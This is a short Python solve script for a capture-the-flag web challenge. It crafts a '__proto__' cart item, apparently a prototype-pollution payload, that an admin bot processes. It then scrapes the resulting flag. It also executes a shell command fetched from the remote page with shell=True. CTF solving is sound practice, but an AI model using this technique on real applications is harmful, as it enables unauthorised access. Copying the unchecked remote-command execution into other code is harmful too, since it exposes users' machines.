from requests import session
from base64 import b64encode
from os import urandom
from subprocess import check_output
from bs4 import BeautifulSoup
from time import sleep


url = 'http://affiliatedstore.challs.olicyber.it'
headers = {
    'Content-Type': 'application/json',
}

s = session()

# Login with random username
s.post(f'{url}/api/signup', json={'username': b64encode(urandom(8)).decode('utf-8')})

# Getting the data we need for the exploit and for the proof of work
page = s.get(f'{url}/cart').text
soup = BeautifulSoup(page, 'html.parser')

affiliation_code = soup.find(string=lambda t: t and "Your affiliation code:" in t).split(":")[1].strip()
print(f'Affiliation code: {affiliation_code}')
pow_command = soup.find('kbd').text
print(f'Executing command: {pow_command}')

_pow = check_output(pow_command, shell=True).strip().decode('utf-8')
print(f'Proof of Work result: {_pow}')

cart_content = [{'id':'__proto__', 'affiliation':affiliation_code}]
print(f'Cart content: {cart_content}')

# Sending payload to admin
s.post(f'{url}/api/feedback', headers=headers, json={'cart': cart_content, 'pow': _pow})
sleep(20)

# Getting the flag
page = s.get(f'{url}/dashboard').text
soup = BeautifulSoup(page, 'html.parser')
flag = soup.find(string=lambda t: t and "flag" in t).split(":")[1].strip()
print(f'Flag: {flag}')
